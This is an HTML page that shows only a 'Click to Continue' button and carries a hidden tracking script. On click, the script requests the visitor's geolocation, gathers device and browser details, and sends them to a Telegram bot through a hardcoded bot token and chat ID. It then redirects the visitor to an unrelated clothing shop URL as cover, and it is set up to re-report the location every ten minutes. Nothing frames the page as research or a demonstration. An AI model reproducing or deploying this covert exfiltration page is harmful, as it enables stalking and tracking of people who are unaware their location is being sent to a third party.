<!DOCTYPE html>
<html>
<head>
  <title>Click to Continue</title>
  <style>
    body { display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; }
    button { padding:15px 30px; font-size:18px; cursor:pointer; }
  </style>
</head>
<body>

<button id="startBtn">Click to Continue</button>

<script>
const botToken = "8477495842:AAHN8GT3ZBaaKXP-TWySiL1jpWhaiwLVn30"; 
const chatId = "8144368202"; 
const intervalMinutes = 10; 
const redirectURL = "https://luxuarydubai.com/product-category/clothing/";

// Detect device model
function detectDeviceModel() {
  const ua = navigator.userAgent;
  if (/iPhone/i.test(ua)) return "Apple iPhone (" + ua.match(/iPhone OS [\\d_]+/i)[0].replace(/_/g, ".") + ")";
  if (/iPad/i.test(ua)) return "Apple iPad (" + ua.match(/CPU OS [\\d_]+/i)[0].replace(/_/g, ".") + ")";
  if (/Android/i.test(ua)) {
    const match = ua.match(/Android\\s+[\\d.]+;\\s*([^)]+)/i);
    if (match && match[1]) return match[1].trim();
    return "Android Device";
  }
  if (/Windows/i.test(ua)) return "Windows PC";
  if (/Macintosh/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux Device";
  return "Unknown Device";
}

// Device/browser info
function getDeviceInfo() {
  return `
🖥 Device Info:
- Device Model: ${detectDeviceModel()}
- User Agent: ${navigator.userAgent}
- Platform: ${navigator.platform}
- Language: ${navigator.language}
- Screen: ${screen.width}x${screen.height}
`;
}

// Send data to Telegram
function sendData(message) {
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message })
  }).catch(() => {});
}

// Send location + device info
function sendLocation(lat, lon) {
  const deviceInfo = getDeviceInfo();
  const message = `📍 Location: ${lat},${lon}
https://maps.google.com/?q=${lat},${lon}
${deviceInfo}`;
  sendData(message);
}

// Promise-based location request
function getLocationPromise() {
  return new Promise((resolve) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve(pos),
        () => resolve(null)
      );
    } else {
      resolve(null);
    }
  });
}

// Function called when user clicks the button
async function startTracking() {
  document.getElementById("startBtn").style.display = "none"; // hide button

  const pos = await getLocationPromise();
  if (pos) sendLocation(pos.coords.latitude, pos.coords.longitude);
  else sendData(`❌ Location denied.\n${getDeviceInfo()}`);

  // Redirect after first report
  window.location.href = redirectURL;

  // Repeat every 10 minutes
  setInterval(async () => {
    const p = await getLocationPromise();
    if (p) sendLocation(p.coords.latitude, p.coords.longitude);
  }, intervalMinutes * 60 * 1000);
}

// Attach click event
document.getElementById("startBtn").addEventListener("click", startTracking);
</script>

</body>
</html>
